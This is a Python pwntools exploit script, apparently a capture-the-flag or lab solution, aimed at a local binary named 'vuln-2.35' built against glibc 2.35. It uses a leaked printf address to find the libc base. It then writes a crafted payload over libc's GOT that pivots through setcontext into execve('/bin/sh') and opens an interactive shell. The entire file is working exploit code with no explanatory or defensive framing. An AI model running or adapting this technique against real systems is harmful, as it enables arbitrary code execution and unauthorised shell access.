#!/usr/bin/env python3
# coding=utf8

import inspect
from pwn import *

context.log_level = 'debug'

cn = process('./vuln-2.35')
libc = ELF("./libc-2.35.so")

def tobytes(x): return x.encode('latin1') if isinstance(x, str) else x
def sd(x): return cn.send(tobytes(x))
def sl(x): return cn.sendline(tobytes(x))
def sa(a, b): return cn.sendafter(tobytes(a), tobytes(b))
def sla(a, b): return cn.sendlineafter(tobytes(a), tobytes(b))
def rv(x=0x1000): return cn.recv(x)
def rl(): return cn.recvline()
def ru(x): return cn.recvuntil(tobytes(x))
def raddr(): return u64(cn.recvuntil(b'\n')[:-1].ljust(8, b'\x00'))
def raddrn(x): return u64(rv(x).ljust(8, b'\x00'))
def interact(): return cn.interactive()
def ss(s): return success(s)


def logsym(val):
    for line in inspect.getframeinfo(inspect.currentframe().f_back)[3]:
        m = re.search(r'\blogsym\s*\(\s*([A-Za-z_][A-Za-z0-9_]*)\s*\)', line)
    if m:
        varname = m.group(1)
        ss(f"{varname} => {hex(val)}")
    else:
        ss(hex(val))


############################################

context.arch = 'amd64'


def lite_context(src: int, rsp=0, rbx=0, rbp=0, rsi=0, rdi=0, rcx=0, rdx=0,
                 rip=0xDEADBEEF) -> bytearray:
    b = flat({
        0x68: rdi,
        0x70: rsi,
        0x78: rbp,
        0x80: rbx,
        0x88: rdx,
        0x98: rcx,
        0xA0: rsp,
        0xA8: rip,  # ret ptr
        0xE0: src,  # fldenv ptr
        # 0x1C0: 0x1F80,  # assume ldmxcsr == 0
    }, filler=b'\x00', word_size=64)[0x68:]
    return b


def fx0(libc: ELF, nudge=8, **kwargs) -> (int, bytes):
    # nudge is used to make sure ldmxcsr == 0,
    # aka [got + 8 + 0x10 + got_count * 8 - 0x68 + nudge + 0x1c0] == 0
    got = libc.address + libc.dynamic_value_by_tag("DT_PLTGOT")
    plt0 = libc.address + libc.get_section_by_name(
        ".plt").header.sh_addr

    write_dest = got + 8
    got_count = 0x36  # hardcoded
    context_dest = write_dest + 0x10 + got_count * 8 - 0x68 + nudge
    warn("make sure [libc.address + 0x{:x} (0x{:x})] == 0".format(
        context_dest + 0x1c0 - libc.address,
        context_dest + 0x1c0
    ))
    write_data = flat(
        context_dest,
        libc.symbols["setcontext"] + 32,
        [plt0] * got_count,
        b'\x00' * nudge,
        lite_context(context_dest, rsp=libc.symbols["environ"] + 8,
                     **kwargs),
    )
    return write_dest, write_data


leak = int(rl(), 16)
logsym(leak)
lbase = leak - libc.sym['printf']
logsym(lbase)
libc.address = lbase

dest, payload = fx0(
    libc,
    rip=libc.sym["execve"],
    rdi=libc.search(b"/bin/sh").__next__(),
    rsi=0,
    rdx=0,
)
ss("write payload to {}, length {}".format(hex(dest), hex(len(payload))))
sd(p64(dest))
sd(p64(len(payload)))
sd(payload)

interact()
